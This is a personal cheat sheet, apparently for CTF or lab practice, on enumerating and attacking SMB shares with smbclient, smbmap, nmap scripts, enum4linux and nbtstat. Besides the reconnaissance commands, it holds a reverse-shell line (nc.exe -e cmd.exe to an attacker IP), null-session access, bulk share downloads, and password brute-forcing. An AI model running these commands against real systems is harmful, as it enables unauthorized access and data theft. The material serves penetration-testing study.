# enumerating SMB 
```bash
smbclient -L //$IP/ ##to check for directories without logging in 
smbclient //$IP/Directory # login without auth

Enumerate Hostname : nmblookup -A [ip] 

-U # Username
```
## flags
```bash
smbmap -H [ip/hostname]
echo exit | smbclient -L \\\\[ip]
nmap --script smb-enum-shares -p 139,445 [ip]
# Check Null Sessions
smbmap -H [ip/hostname]
smbclient \\\\[ip]\\[share name]
nmap --script smb-vuln* -p 139,445 [ip] # Check for Vulnerabilities - 
Overall Scan - enum4linux -a [ip] 
smbver.sh [IP] (port) [Samba] # Manual Inspection
-N #Force to not use password aka NULL session attack
get flag_1 - # read file
```

# Nbtstat ( Windows )
![[Pasted image 20221123163002.png]]
```powershell
nbtstat -A <IP>

Unique # Only 1 Ip assigned to the machine
<00>   # Workstation 
<20>   # File share is running 

```

## NET VIEW 

![[Pasted image 20221123163219.png]]
```
NET VIEW <target IP>
```

## Linux
![[Pasted image 20221123163345.png]]
```bash
nmblookup -A <Target IP>

```


# SMB server
smbserver.py NAME $(DIR) -smb2support -user USER -password password
exde1234
```
smbserver.py share DIRECTORY # Start Smbserver



# Connect back to smb server (Windows)

\\IP\SHARE\nc.exe -e cmd.exe IP PORT
```




# connect smb windows
$pass = convertto-securestring 'exde1234' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('super', $pass)
New-PSDrive -Name super -PSProvider FileSystem -Credential $cred -Root \\10.10.17.185\super


# Download everything in share

```
prompt off
recurse on
ls
mget *
```

# Brute-Force 

```bash
# Metasploit
smb_login

```

# Check for shares permissions

```
smbmap -H demo.ine.local
```

# Enum4linux
```bash
enum4linux -s ~/Desktop/wordlists/100-common-passwords.txt demo.ine.local # brute force directory name

enum4linux -U <IP> # enum users

-P # Password policy
-o # OS info
-l # ldap
-a # ALL 

```